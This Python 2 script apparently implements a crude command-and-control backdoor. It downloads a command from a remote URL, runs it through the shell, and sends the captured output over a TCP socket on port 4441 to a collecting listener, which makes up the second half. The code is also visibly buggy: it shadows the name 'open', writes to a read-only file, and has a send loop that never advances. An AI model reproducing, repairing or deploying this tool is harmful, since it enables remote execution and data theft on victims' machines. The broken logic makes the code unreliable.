__author__ = 'besimaltnok'

import urllib2
import socket
import subprocess

#Get Command
url = "www.command.com/command.txt"
open  = urllib2.urlopen(url)
read = open.read()

#Execute Command
command = subprocess.Popen(read, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
stdout_value = command.stdout.read() + command.stderr.read()

#Open and Write in File
data = open('data.txt','rb')
data.write(stdout_value)
data.close()

#Send File
ip = ""
port = 4441

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
l = data.read(1024)
while (l):
    print 'Sending...'
    s.send(l)
data.close()
print "Done Sending"
s.close()

#Recieving File
import socket
s = socket.socket()
host = socket.gethostname()
port = 4441
s.bind((host, port))
file = open('data.txt','wb')
s.listen(5)

while True:
    c, addr = s.accept()
    print 'Got connection from', addr
    l = c.recv(1024)
    while (l):
        file.write(l)
        l = c.recv(1024)
    file.close()
    print "Done"
    c.close()
